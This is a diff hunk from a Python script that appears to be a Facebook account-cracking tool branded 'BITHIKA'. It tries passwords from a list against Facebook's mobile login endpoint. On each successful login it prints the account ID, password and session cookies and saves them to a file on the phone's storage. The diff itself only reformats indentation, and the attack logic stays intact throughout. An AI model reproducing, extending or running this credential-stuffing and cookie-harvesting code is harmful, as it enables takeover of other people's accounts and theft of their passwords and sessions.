@@ -1371,21 +1371,21 @@ def rndm4(uid,passlist):
 'user-agent': au,
 'x-asbd-id': '129477',
 'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-                        response = session.post(f'https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers)
+                        response = session.post(f'https://m.facebook.com/login/device-based/login/async/', data=data, headers=headers)
                         if response.status_code == 200:
-                           json_response = response.json()
-                           if json_response.get('status') == 'ok':
-                               if json_response.get('login') == 'success':
-                                   session_cookies = session.cookies.get_dict()
-                                   coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
-                                   print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
-                                   print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                   open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
-                                   oks.append(cid)
-                                   return True
+                            json_response = response.json()
+                            if json_response.get('status') == 'ok':
+                                if json_response.get('login') == 'success':
+                                    session_cookies = session.cookies.get_dict()
+                                    coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
+                                    print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} ' + cid + f' | ' + pas + '\033[1;97m')
+                                    print(f"\r\r{G}[{G}COOKIE{G}]>{R} " + coki)
+                                    open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid + ' | ' + pas + ' |-> ' + coki + "\n")
+                                    oks.append(cid)
+                                    return True
                         else:
-                                   print(f"[ERROR] - Status code: {response.status_code}")
-                                   continue
+                            print(f"[ERROR] - Status code: {response.status_code}")
+                            continue
                 loop+=1
         except Exception as e:
                 pass
